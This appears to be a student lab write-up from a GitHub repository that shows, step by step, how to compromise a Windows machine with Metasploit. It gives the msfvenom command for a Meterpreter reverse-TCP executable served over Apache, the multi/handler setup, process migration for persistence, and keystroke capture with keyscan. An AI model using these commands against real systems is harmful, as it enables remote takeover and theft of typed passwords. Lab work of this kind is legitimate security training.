# Compromising-windows-using-Metasploit
Compromising windows using Metasploit

# Metasploit
Compromising windows using Metasploit

# AIM:
To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig

### EXECUTION STEPS AND ITS OUTPUT:
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/ed78fb61-06bf-4ff8-bbeb-be96ed068caa)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

### OUTPUT:
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/dddb532f-d29f-42fa-9b3f-f1318cc06670)

copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/1d1a832b-4562-4788-8160-22c4414c2128)

Start apache server sudo systemctl apache2 start
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/b7d467f5-85e7-4147-8016-08f5ffb6ed9a)

Check the status of apache2
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/a2306df0-d5fc-425c-8aaa-5763ec6ce70c)
Invoke msfconsole

### OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/15659ef1-0aa4-46be-b27c-9aa33ffc0adc)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/a91005c0-cf23-4116-b617-0c23020f3f32)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/ae723933-be47-417f-91e4-f78e608c616f)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/08c920d6-471d-42db-9b3b-49992463d9d9)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/c3c5264d-c81f-43cc-8947-41c22c659bb0)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/SivaramakrishnanBaskar/Compromising-windows-using-Metasploit/assets/119476322/86f2a732-7ba0-4f83-a604-987e07667322)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
